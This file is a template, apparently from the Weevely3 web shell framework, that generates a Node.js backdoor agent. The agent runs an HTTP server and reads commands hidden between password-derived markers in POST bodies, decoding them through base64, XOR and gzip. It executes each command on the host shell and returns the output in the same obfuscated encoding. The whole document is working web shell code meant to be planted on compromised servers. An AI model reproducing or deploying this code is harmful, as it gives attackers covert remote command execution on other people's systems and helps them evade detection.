<%! import hashlib, weevely, string %>
<%
passwordhash = hashlib.md5(password.encode('utf-8')).hexdigest().lower()
key = passwordhash[:8]
header = passwordhash[8:20]
footer = passwordhash[20:32]
PREPEND = weevely.utils.strings.randstr(16, charset = string.digits + string.ascii_letters).decode('utf-8')
%>
const http = require('http');
const zlib = require('zlib');
const { exec } = require('child_process');

// Weevely3 Node.js Agent
// Implements XOR -> GZIP -> Base64 protocol

const K = "${key}";
const KH = "${header}";
const KF = "${footer}";
const P = "${PREPEND}";
const PORT = process.env.PORT || 8080;

function xor(text, key) {
    const res = Buffer.alloc(text.length);
    for (let i = 0; i < text.length; i++) {
        res[i] = text[i] ^ key.charCodeAt(i % key.length);
    }
    return res;
}

const server = http.createServer((req, res) => {
    if (req.method === 'POST') {
        let body = [];
        req.on('data', (chunk) => {
            body.push(chunk);
        }).on('end', () => {
            body = Buffer.concat(body).toString();
            
            const start = body.indexOf(KH);
            const end = body.indexOf(KF);
            
            if (start !== -1 && end !== -1) {
                const payload = body.substring(start + KH.length, end);
                
                // Decode: Base64 -> XOR -> Gunzip
                try {
                    const decoded = Buffer.from(payload, 'base64');
                    const unxorred = xor(decoded, K);
                    
                    zlib.gunzip(unxorred, (err, buffer) => {
                        if (!err) {
                            const cmd = buffer.toString();
                            
                            exec(cmd, (error, stdout, stderr) => {
                                const output = (stdout || '') + (stderr || '');
                                
                                // Encode: Gzip -> XOR -> Base64
                                zlib.gzip(output, (err, compressed) => {
                                    if (!err) {
                                        const reXorred = xor(compressed, K);
                                        const encoded = reXorred.toString('base64');
                                        
                                        res.writeHead(200, { 'Content-Type': 'text/plain' });
                                        res.end(P + KH + encoded + KF);
                                    }
                                });
                            });
                        }
                    });
                } catch (e) {
                    res.end();
                }
            } else {
                res.end();
            }
        });
    } else {
        res.writeHead(200);
        res.end('Node Agent Running');
    }
});

server.listen(PORT, () => {
    console.log(`Agent running on port ${"$"}{PORT}`);
});
